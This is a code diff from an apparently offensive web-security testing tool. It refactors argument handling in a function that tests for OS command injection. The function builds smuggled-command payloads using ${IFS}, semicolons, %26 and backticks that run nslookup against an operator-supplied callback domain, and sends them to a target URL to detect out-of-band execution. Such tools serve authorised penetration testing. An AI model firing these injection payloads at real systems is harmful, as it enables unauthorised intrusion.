@@ -5,7 +5,7 @@ import random
 from src.httpreqs.request import REQUEST
 from src.httpreqs.request import prepareRequest
 from src.configs.config import proxies
-from src.utils.arguments import ArgumentHandler
+from src.utils.arguments import init_args
 from src.utils import colors
 
 def is_value_in_dict(dictionary, target_value):
@@ -41,8 +41,8 @@ def generate_random_alphanumeric():
 
 def test_cmd_injection(url, post):
     """Test CMD Injection"""
-    args = ArgumentHandler()
-    if args.args['verbose']:
+    args  = init_args()
+    if args['verbose']:
         print(colors.blue("[i]") + " Testing results-based OS command injection...")
 
     cmdList = []
@@ -58,57 +58,57 @@ def test_cmd_injection(url, post):
     for _ in range(7):
         randomVal.append(generate_random_alphanumeric())
 
-    if args.args['callback']:
+    if args['callback']:
         cmdList.append(
             "1;nslookup${IFS}"
             + randomVal[0]
             + "."
-            + args.args['callback']
+            + args['callback']
             + ";%23${IFS}';nslookup${IFS}"
             + randomVal[1]
             + "."
-            + args.args['callback']
+            + args['callback']
             + ';%23${IFS}";nslookup${IFS}'
             + randomVal[2]
             + "."
-            + args.args['callback']
+            + args['callback']
             + ";%23${IFS}"
         )
         cmdList.append(
             "1%26nslookup "
             + randomVal[3]
             + "."
-            + args.args['callback']
+            + args['callback']
             + "%26`nslookup "
             + randomVal[4]
             + "."
-            + args.args['callback']
+            + args['callback']
             + '`%26"1%26nslookup '
             + randomVal[5]
             + "."
-            + args.args['callback']
+            + args['callback']
             + "%26`nslookup "
             + randomVal[6]
             + "."
-            + args.args['callback']
+            + args['callback']
             + "`%26".format(randomVal[3], randomVal[4], randomVal[5])
         )
 
     nslookupFlag = False
     for _, cmd in enumerate(cmdList):
-        u, reqHeaders, postTest = prepareRequest(args.args['param'], cmd, url, post)
+        u, reqHeaders, postTest = prepareRequest(args['param'], cmd, url, post)
 
-        if "nslookup" in cmd and args.args['verbose'] and not nslookupFlag:
+        if "nslookup" in cmd and args['verbose'] and not nslookupFlag:
             nslookupFlag = True
-            if args.args['verbose']:
+            if args['verbose']:
                 print(
                     colors.blue("[i]")
                     + " Trying to provoke an external callback to '"
-                    + args.args['callback']
+                    + args['callback']
                     + "'. Check your listener logs..."
                 )
 
         _, br = REQUEST(u, reqHeaders, postTest, proxies, "RCE", "CMD")
 
-        if not br or args.args['quick']:
+        if not br or args['quick']:
             return
